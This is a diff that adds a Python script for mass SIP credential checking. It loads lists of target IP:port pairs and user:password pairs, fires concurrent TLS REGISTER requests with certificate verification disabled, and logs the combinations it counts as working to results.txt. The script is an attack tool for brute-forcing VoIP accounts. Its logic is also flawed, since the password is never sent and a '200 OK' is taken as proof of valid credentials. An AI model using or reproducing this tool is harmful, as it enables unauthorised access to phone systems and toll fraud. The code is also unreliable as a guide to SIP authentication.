@@ -1,0 +1,87 @@
+import sys
+import asyncio
+import socket
+import ssl
+
+async def check_sip(host, port, user, password):
+    try:
+        context = ssl.SSLContext(ssl.PROTOCOL_TLS)
+        context.verify_mode = ssl.CERT_NONE  # Disable certificate verification (for testing purposes only)
+
+        reader, writer = await asyncio.open_connection(host, port, ssl=context)
+        msg = f'REGISTER sip:{host} SIP/2.0\r\n' \
+              f'Via: SIP/2.0/TLS {host};branch=z9hG4bK{generate_random_string(7)};rport\r\n' \
+              f'From: <sip:{user}@{host}>;tag={generate_random_string(8)}\r\n' \
+              f'To: <sip:{user}@{host}>\r\n' \
+              f'Contact: <sip:{user}@{host}>\r\n' \
+              f'Call-ID: {generate_random_string(13)}\r\n' \
+              f'CSeq: 20 REGISTER\r\n' \
+              f'User-Agent: pplsip\r\n' \
+              f'Expires: 600\r\n' \
+              f'Allow: INVITE, ACK, CANCEL, OPTIONS, BYE, REFER, NOTIFY, MESSAGE, SUBSCRIBE, INFO\r\n' \
+              f'Content-Length: 0\r\n\r\n'
+
+        writer.write(msg.encode())
+        await writer.drain()
+
+        response = (await asyncio.wait_for(reader.read(8192), timeout=5)).decode()
+
+        if "200 OK" in response:
+            print(f"SUCCESS: {host}:{port} {user}:{password}")
+            with open("results.txt", "a") as result_file:
+                result_file.write(f"{host}:{port} {user}:{password}\n")
+        else:
+            print(f"FAILED: {host}:{port} {user}:{password}")
+
+        writer.close()
+        await writer.wait_closed()
+
+    except asyncio.TimeoutError:
+        print(f"TIMEOUT: {host}:{port} {user}:{password}")
+    except Exception as e:
+        print(f"ERROR: {host}:{port} {user}:{password} - {str(e)}")
+
+def generate_random_string(length):
+    import random
+    import string
+    return ''.join(random.choices(string.ascii_letters, k=length))
+
+if __name__ == "__main__":
+    if len(sys.argv) < 5:
+        print("Usage: script.py <max_concurrent> <type> <IpsFile> <UserPassFile>")
+        sys.exit(1)
+
+    max_concurrent = int(sys.argv[1])
+    type_val = int(sys.argv[2])
+    ips_file = sys.argv[3]
+    user_pass_file = sys.argv[4]
+
+    found_ip = []
+
+    with open(ips_file, "r") as ips_file_obj:
+        found_ip = [line.strip() for line in ips_file_obj]
+
+    with open(user_pass_file, "r") as user_pass_file_obj:
+        user_pass_list = [line.strip() for line in user_pass_file_obj]
+
+if type_val == 1:
+    semaphore = asyncio.Semaphore(max_concurrent)
+    
+    async def check_sip_with_semaphore(host, port, user, password):
+        async with semaphore:
+            await check_sip(host, int(port), user, password)
+
+    loop = asyncio.get_event_loop()
+    tasks = [check_sip_with_semaphore(host, port, user, password) for user_pass in user_pass_list for host, port, user, password in [ip.split(":") + user_pass.split(":") for ip in found_ip]]
+    loop.run_until_complete(asyncio.gather(*tasks))
+    loop.close()
+
+elif type_val == 2:  # 
+    print("Method type 2 not supported yet.")
+    sys.exit(1)
+
+else:
+    print("Invalid type value. Use 1 for user:pass combo or 2 for other methods.")
+    sys.exit(1)
+
+print("\n----------Done----------\n")
